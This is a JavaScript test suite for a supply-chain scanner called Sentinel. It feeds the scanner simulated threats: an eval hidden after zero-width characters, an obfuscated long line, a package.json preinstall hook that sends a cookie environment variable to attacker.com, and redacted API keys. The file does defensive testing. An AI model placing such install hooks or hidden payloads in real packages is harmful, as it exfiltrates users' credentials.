/**
 * Sentinel: Scanner Test Suite (Midu-style Exploit Simulation)
 * 
 * IMPORTANT NOTE FOR AUDITORS: 
 * This file and its contents only contain DUMMY payloads meant for testing the scanner.
 * Not real malware or secrets. They are simulated purely for functional tests.
 */

const { scanFile } = require('./index');

// 1. Invisible Unicode (Midu-style 36KB line simulation)
const invisiblePayload = "// Safe code here" + "\u200B".repeat(50) + " eval('malware')";
const invisibleTest = scanFile('malicious_file.js', invisiblePayload);

// 2. High Entropy / Obfuscation
const largeLinePayload = "console.log('start');\n" + "A".repeat(2000) + ";\nconsole.log('end');";
const entropyTest = scanFile('obfuscated.js', largeLinePayload);

// 3. Dangerous Lifecycle Script
const packageJsonPayload = JSON.stringify({
    name: "test-pkg",
    scripts: {
        "preinstall": "node -e \"fetch('http://attacker.com?c=' + process.env.COOKIE)\""
    }
}, null, 2);
const lifecycleTest = scanFile('package.json', packageJsonPayload);


// 4. Secret Detection Tests
const secretPayloads = [
  { name: 'aws_leak.tf', content: 'aws_access_key_id = "REDACTED_AWS_ACCESS_KEY"' },
  { name: 'config.js', content: 'const API_KEY = "REDACTED_GHP_TOKEN";' },
  { name: '.env.production', content: 'OPENAI_API_KEY=REDACTED_SK_PROJ_TOKEN' },
  { name: 'deploy.sh', content: 'curl -H "Authorization: Bearer REDACTED_JWT_TOKEN"' },
  { name: 'keys.pem', content: '-----BEGIN REDACTED KEY-----\nMIIEvgIBADANBg...' },
  { name: 'db.js', content: 'const uri = "mongodb+srv://REDACTED_MONGO_URL";' },
  { name: 'stripe.js', content: 'const stripe = require("stripe")("REDACTED_STRIPE_SK_LIVE");' },
];

const secretResults = secretPayloads.map(p => scanFile(p.name, p.content));
\nconsole.log("=== SENTINEL SCAN RESULTS ===\n");

function printResults(test) {
    console.log(`File: ${test.filename}`);
    if (test.alerts.length === 0) {
        console.log("  ✅ Clean");
    } else {
        test.alerts.forEach(alert => {
            const sev = alert.severity || alert.riskLevel || '?';
            const type = alert.type || alert.ruleName || 'RULE_MATCH';
            const msg = alert.message || alert.description || 'No description';
            console.log(`  [${sev}] ${type}: ${msg}`);
        });
    }
    console.log("-".repeat(30));
}

printResults(invisibleTest);
printResults(entropyTest);
printResults(lifecycleTest);

console.log("\n=== SECRET DETECTION TESTS ===\n");
secretResults.forEach(r => printResults(r));
